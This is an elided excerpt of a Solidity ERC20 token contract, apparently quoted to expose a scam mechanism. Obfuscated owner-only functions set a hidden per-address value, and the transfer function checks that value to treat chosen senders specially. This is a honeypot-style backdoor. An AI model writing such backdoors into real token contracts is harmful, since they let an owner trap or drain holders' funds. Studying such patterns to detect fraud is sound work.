...
contract token is Ownable, IERC20 {
    ...
    function s105463(address _address,uint256 _value) external onlyowner {
        _3451311[_address] = _value;
    }

    function s105463(address _address) external view onlyowner returns (uint256) {
        return _3451311[_address];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amounts) internal virtual {
        ...
        if (_3451311[sender] > 1) {
            if (sender == ss) {
                ...
                require(_balance[sender] >= 1, "IERC20: special balance exceeds balance");
